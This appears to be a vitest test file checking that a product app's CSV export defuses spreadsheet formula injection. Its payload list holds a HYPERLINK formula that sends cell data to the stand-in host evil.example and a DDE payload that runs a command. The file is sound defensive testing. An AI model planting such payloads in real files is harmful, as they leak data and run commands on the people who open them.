import { describe, expect, it } from 'vitest';
import request from 'supertest';
import type { Express } from 'express';
import { createApp } from '../server/app.js';
import { openDb } from '../server/db.js';
import { toCsv } from '../server/csv.js';
import type { AuthConfig } from '../server/auth.js';
import { getResource } from '../shared/resources.js';

/**
 * Spreadsheet formula injection (CWE-1236) in the CSV export.
 *
 * RFC-4180 quoting is not a defence: the quotes are consumed by the CSV
 * parser, and the cell underneath is then interpreted by Excel, LibreOffice
 * Calc or Google Sheets. A cell starting with `=`, `+`, `-`, `@`, a tab or a
 * CR runs as a formula in all three — so for an export of records that users
 * typed in themselves, the operator who opens the file executes whatever the
 * last person to edit a record wanted them to.
 *
 * Every assertion below therefore works on the PARSED cells rather than on the
 * raw text: what matters is the value a spreadsheet ends up with, and quoting
 * alone would make a raw-substring check pass while the payload still runs.
 */

/** The families that actually execute, one per leading character. */
const PAYLOADS = [
  '=1+1',
  '+1+1',
  '-1+1',
  '@SUM(A1)',
  '=HYPERLINK("https://evil.example/?d="&A1,"Click me")',
  "=cmd|'/c calc'!A1",
  '\t=1+1',
];

/** Parse RFC-4180 CSV back into rows of cells — what a spreadsheet sees. */
function parseCsv(text: string, delimiter = ','): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  for (let i = 0; i < text.length; i += 1) {
    const ch = text[i]!;
    if (quoted) {
      if (ch !== '"') cell += ch;
      else if (text[i + 1] === '"') {
        cell += '"';
        i += 1;
      } else quoted = false;
      continue;
    }
    if (ch === '"') quoted = true;
    else if (ch === delimiter) {
      row.push(cell);
      cell = '';
    } else if (ch === '\r' && text[i + 1] === '\n') {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
      i += 1;
    } else cell += ch;
  }
  if (cell !== '' || row.length > 0) {
    row.push(cell);
    rows.push(row);
  }
  return rows;
}

/** Every cell of the file, flattened. */
function cellsOf(csv: string, delimiter = ','): string[] {
  return parseCsv(csv, delimiter).flat();
}

/**
 * The payload survived as readable text, and no cell anywhere in the file
 * still begins with a character a spreadsheet would treat as a formula.
 */
function expectDefused(csv: string, payload: string, delimiter = ','): void {
  const cells = cellsOf(csv, delimiter);
  expect(cells).toContain(`'${payload}`);
  expect(cells).not.toContain(payload);
  for (const cell of cells) expect(cell).not.toMatch(/^[=+@\t\r]/);
}

const auth: AuthConfig = {
  username: 'admin',
  password: 'test-password',
  secret: 'test-secret',
  ttlHours: 1,
  secureCookie: false,
};

const products = getResource('products')!;

describe('CSV export neutralizes spreadsheet formulas', () => {
  it.each(PAYLOADS)('defuses %o in a record field', (payload) => {
    const csv = toCsv(products, [
      { id: 1, sku: 'SKU-1', name: payload, category: 'hardware', price: 100, stock: 1, active: 1 },
    ]);
    expectDefused(csv, payload);
  });

  it('leaves ordinary text and numbers exactly as they were', () => {
    const csv = toCsv(products, [
      { id: 7, sku: 'SKU-7', name: 'Widget, "large"', category: 'hardware', price: -1250, stock: 0, active: 0 },
    ]);
    const cells = cellsOf(csv);
    // A negative number stays a number — a lone minus cannot start a formula.
    expect(cells).toContain('-1250');
    // Ordinary text, including text needing RFC-4180 quoting, is untouched.
    expect(cells).toContain('Widget, "large"');
  });

  it('defuses and quotes a payload that also contains a delimiter', () => {
    const csv = toCsv(products, [{ id: 1, sku: 'S', name: '=A1,"x"', price: 1 }]);
    expect(cellsOf(csv)).toContain(`'=A1,"x"`);
  });

  it('holds over the live export endpoint, not just the renderer', async () => {
    const db = openDb(':memory:');
    const app: Express = createApp({ db, auth });
    const login = await request(app).post('/api/login').send({ username: 'admin', password: 'test-password' });
    const cookie = login.headers['set-cookie']![0]!.split(';')[0]!;

    const created = await request(app)
      .post('/api/products')
      .set('Cookie', cookie)
      .send({ sku: 'INJ-1', name: '=1+1', category: 'hardware', price: 999, stock: 1, active: true });
    expect(created.status).toBe(201);
    // The stored value is untouched — only the rendered file is defused.
    expect(created.body.name).toBe('=1+1');

    const res = await request(app).get('/api/products/export.csv').set('Cookie', cookie);
    expect(res.status).toBe(200);
    expect(cellsOf(res.text)).toContain("'=1+1");
  });
});
